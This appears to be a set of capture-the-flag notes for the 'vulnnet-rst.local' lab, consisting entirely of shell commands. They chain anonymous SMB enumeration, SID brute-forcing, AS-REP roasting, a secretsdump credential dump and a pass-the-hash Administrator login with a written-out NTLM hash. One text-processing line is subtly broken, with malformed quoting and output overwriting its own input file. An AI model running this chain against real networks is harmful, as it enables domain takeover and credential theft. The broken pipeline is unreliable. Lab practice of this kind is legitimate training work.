```
smbmap -u anonymous -H $IP

python3 /opt/impacket/examples/lookupsid.py anonymous@$IP | tee users.txt

grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\" -f2 > users.txt

python3 /opt/impacket/examples/GetNPUsers.py -dc-ip $IP -usersfile users.txt -no-pass vulnnet-rst.local/

impacket-secretsdump vulnnet-rst.local/a-whitehat@$IP

evil-winrm -i $IP -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
```